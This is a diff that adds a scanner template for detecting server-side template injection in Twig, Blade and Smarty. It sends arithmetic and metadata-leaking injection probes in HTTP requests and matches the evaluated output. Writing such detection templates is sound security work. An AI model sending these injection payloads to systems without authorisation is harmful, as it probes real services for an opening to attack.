@@ -1,0 +1,188 @@
+id: ssti-php-twig-blade-detection
+
+info:
+  name: SSTI - PHP Template Engines (Twig / Blade / Smarty)
+  author: achraf-chehboun
+  severity: critical
+  description: |
+    Specialized detection for Server-Side Template Injection in PHP frameworks.
+    Targets Twig (Symfony default), Blade (Laravel), and Smarty. Uses engine-specific
+    expression syntax and filter chains to differentiate engines. Exploits arithmetic
+    operations and string manipulation only — no file access or code execution.
+  reference:
+    - https://portswigger.net/research/server-side-template-injection
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-1336
+  metadata:
+    max-request: 12
+  tags: ssti,twig,blade,smarty,php,symfony,laravel,detection-only
+
+http:
+  # === TWIG (Symfony) ===
+  # Twig: {{expr}} with multiplication
+  - raw:
+      - |
+        GET /?name={{267*269}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers:
+      - type: dsl
+        name: twig-basic-eval
+        dsl:
+          - 'contains(body, "71823") && !contains(body, "{{267")'
+
+  # Twig: string repetition differentiator — {{7*'7'}} = 49 in Twig (arithmetic)
+  - raw:
+      - |
+        GET /?name={{7*'7'}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: twig-confirmed-arithmetic
+        dsl:
+          - 'contains(body, "49") && !contains(body, "7777777")'
+
+      - type: dsl
+        name: jinja2-confirmed-string-repeat
+        dsl:
+          - 'contains(body, "7777777")'
+
+  # Twig filter chain confirmation
+  - raw:
+      - |
+        GET /?name={{'TWIG_SSTI'|lower}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers:
+      - type: word
+        name: twig-filter-chain
+        words:
+          - "twig_ssti"
+        part: body
+
+  # Twig: _self reference (leaks template metadata)
+  - raw:
+      - |
+        GET /?name={{_self.env.getExtension("Twig\Extension\CoreExtension").getClass().getName()}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers:
+      - type: regex
+        name: twig-class-leak
+        regex:
+          - '(?i)Twig\\\\(?:Extension|Environment|Template)'
+        part: body
+
+  # Twig: dump() function (debug mode leak)
+  - raw:
+      - |
+        GET /?name={{dump(app)}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers:
+      - type: dsl
+        name: twig-dump-leak
+        dsl:
+          - 'contains(body, "Symfony\\") || contains(body, "kernel.debug") || contains(body, "APP_ENV")'
+
+  # === LARAVEL BLADE ===
+  # Blade: {{ expr }} — same as Twig syntax but different engine context
+  - raw:
+      - |
+        POST /search HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html
+
+        q={{267*269}}
+      - |
+        POST /search HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html
+
+        q=@php echo 267*269; @endphp
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: blade-double-brace-eval
+        dsl:
+          - 'contains(body_1, "71823")'
+      - type: dsl
+        name: blade-php-directive-eval
+        dsl:
+          - 'contains(body_2, "71823")'
+
+  # Blade: {!! unescaped output !!}
+  - raw:
+      - |
+        GET /?name={!!267*269!!} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers:
+      - type: dsl
+        name: blade-unescaped-eval
+        dsl:
+          - 'contains(body, "71823") && !contains(body, "{!!")'
+
+  # === SMARTY ===
+  # Smarty: {expr}
+  - raw:
+      - |
+        GET /?name={267*269} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers:
+      - type: dsl
+        name: smarty-basic-eval
+        dsl:
+          - 'contains(body, "71823") && !contains(body, "{267*269}")'
+
+  # Smarty: {if} conditional
+  - raw:
+      - |
+        GET /?name={if 267*269==71823}SMARTY_SSTI_CONFIRMED{/if} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers:
+      - type: word
+        name: smarty-conditional-eval
+        words:
+          - "SMARTY_SSTI_CONFIRMED"
+        part: body
+
+  # Smarty: {$smarty.version} variable leak
+  - raw:
+      - |
+        GET /?name={$smarty.version} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers:
+      - type: regex
+        name: smarty-version-leak
+        regex:
+          - '[2-4]\.[0-9]+\.[0-9]+'
+        part: body
+
+    extractors:
+      - type: regex
+        name: engine-errors
+        group: 0
+        regex:
+          - '(?i)((?:Twig|Blade|Smarty|Symfony)[\w\\\\. ]*(?:Error|Exception|CompileError)[^<\n]{0,300})'
+          - '(?i)(Twig_Error_[A-Za-z]+[^<\n]{0,200})'
